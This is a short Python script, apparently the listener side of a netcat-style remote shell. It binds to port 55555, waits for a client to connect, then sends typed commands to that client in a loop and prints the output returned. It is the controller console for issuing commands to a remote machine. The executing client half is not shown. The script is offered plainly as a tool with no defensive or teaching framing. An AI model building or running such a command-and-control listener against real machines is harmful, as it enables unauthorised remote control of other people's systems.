"""And this one to
netcat.py"""

import socket
import sys
import os

os.system("clear")

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

global host
global port

host = ""
port = 55555
try:
    s.bind((host,port))

    print("waiting for the client to connect....")
    s.listen(5)

    (conn,addr) = s.accept()
    print("Clint address = ",addr)
except Exception as e:
    print("[!]",e,host,':',port)
    exit()

while True:
    com = input("~$ ")
    conn.send(str.encode(com))
    if com == "exit" or com == "quite":
        break
    m = str(conn.recv(999999999),"utf-8")
    print(m)

conn.close()